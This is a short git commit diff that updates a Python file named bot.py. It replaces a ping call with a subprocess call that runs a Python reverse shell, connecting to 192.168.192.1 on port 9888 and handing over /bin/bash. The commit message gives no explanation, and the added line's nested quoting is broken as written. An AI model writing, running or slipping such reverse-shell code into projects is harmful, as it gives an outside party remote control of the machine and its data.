c6885fda863335b937edfcd662a2247c68bc224f
lauraalmrui <83592959+lauraalmrui@users.noreply.github.com>
2024-01-29 20:24:13 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,5 +1,5 @@
 import socket
 import subprocess
 def run():
- subprocess.run(["ping", "-c", "4", "google.com"])
- python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.192.1",9888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+ subprocess.run(["python3", "-c", "import os,pty,socket;s=socket.socket();s.connect(("192.168.192.1",9888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")"])
+
